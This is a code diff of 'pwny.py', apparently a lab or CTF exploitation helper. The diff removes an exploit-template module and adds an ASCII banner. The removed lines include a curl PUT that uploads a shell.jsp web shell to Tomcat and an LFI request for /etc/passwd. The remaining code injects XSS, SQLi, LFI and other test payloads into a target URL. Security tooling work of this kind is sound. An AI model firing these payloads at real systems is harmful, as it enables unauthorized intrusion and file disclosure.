@@ -4,12 +4,10 @@ pwny.py - HTN Exploitation Helper
 
 Modules:
   - CVE Fetcher: auto-fetch & rank CVEs for given product/version
-  - Exploit Launcher: generate working exploit PoCs from templates
   - Web Vuln Tester: inject quick payloads for XSS, SQLi, LFI, RFI, CMDi
 
 Usage examples:
   ./pwny.py cve apache 2.4.49
-  ./pwny.py exploit tomcat_rce --target 10.10.10.10 --path testapp
   ./pwny.py webtest http://10.10.10.10/index.php
 """
 
@@ -19,16 +17,25 @@ import os
 import argparse
 from datetime import datetime
 
+def print_banner():
+    banner = r"""
+██████╗ ██╗    ██╗███╗   ██╗██╗   ██╗
+██╔══██╗██║    ██║████╗  ██║ ╚██╗ ██╔╝
+██████╔╝██║ █╗ ██║██╔██╗ ██║  ╚████╔╝ 
+██╔═══╝ ██║███╗██║██║╚██╗██║   ╚██╔╝  
+██║     ╚███╔███╔╝██║ ╚████║    ██║   
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝    ╚═╝   
+     🐴  P W N Y  🐴   v1.0
+    HTN Exploitation Helper Toolkit
+"""
+    print(banner)
+
+
 # ============ CONFIG ============
 USER_AGENT = "HTN-Exploitation-Helper/1.0"
 CVE_API = "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch="
 
 LOG_DIR = "logs"
-
-EXPLOIT_TEMPLATES = {
-    "tomcat_rce": "curl -s -X PUT http://{target}:8080/{path}/shell.jsp --data '{payload}'",
-    "php_lfi": "curl 'http://{target}/index.php?page=../../../../etc/passwd'"
-}
 
 PAYLOADS = {
     "xss": "<script>alert(1)</script>",
@@ -81,8 +88,6 @@ def fetch_cves(product, version):
         return []
 
 
-
-
 def rank_cves(cves):
     ranked = []
     for cve in cves:
@@ -96,13 +101,6 @@ def rank_cves(cves):
             weight += 2
         ranked.append((cve["id"], score, desc[:100], weight))
     return sorted(ranked, key=lambda x: x[3], reverse=True)
-
-
-# ================= EXPLOIT LAUNCHER =================
-def launch_exploit(template_name, **kwargs):
-    if template_name not in EXPLOIT_TEMPLATES:
-        return f"[!] No template found for {template_name}"
-    return EXPLOIT_TEMPLATES[template_name].format(**kwargs)
 
 
 # ================= WEB VULN TESTER =================
@@ -145,6 +143,7 @@ def log_result(module, data):
 
 # ================= CLI =================
 def main():
+    print_banner()
     parser = argparse.ArgumentParser(description="pwny.py - HTN Exploitation Helper")
     subparsers = parser.add_subparsers(dest="command", required=True)
 
@@ -153,16 +152,9 @@ def main():
     cve_parser.add_argument("product", help="Product name (e.g., apache)")
     cve_parser.add_argument("version", help="Version (e.g., 2.4.49)")
 
-    # Exploit launcher
-    exploit_parser = subparsers.add_parser("exploit", help="Launch exploit template")
-    exploit_parser.add_argument("template", help="Exploit template name")
-    exploit_parser.add_argument("--target", help="Target IP/hostname")
-    exploit_parser.add_argument("--path", default="", help="Path if required")
-    exploit_parser.add_argument("--payload", default="pwned", help="Payload string")
-
     # Web vuln tester
     web_parser = subparsers.add_parser("webtest", help="Test web vulnerabilities")
-    web_parser.add_argument("url", help="Target URL (e.g., http://10.10.10.10/index.php)")
+    web_parser.add_argument("url", help="Target URL (e.g., http://10.10.10.10/)")
 
     args = parser.parse_args()
 
@@ -172,11 +164,6 @@ def main():
         ranked = rank_cves(cves)
         for c in ranked[:10]:
             print(f" {c[0]} | CVSS: {c[1]} | {c[2]}")
-
-    elif args.command == "exploit":
-        print(f"[+] Generating exploit for {args.template}...")
-        cmd = launch_exploit(args.template, target=args.target, path=args.path, payload=args.payload)
-        print(f"[CMD] {cmd}")
 
     elif args.command == "webtest":
         print(f"[+] Testing {args.url} for common vulns...")
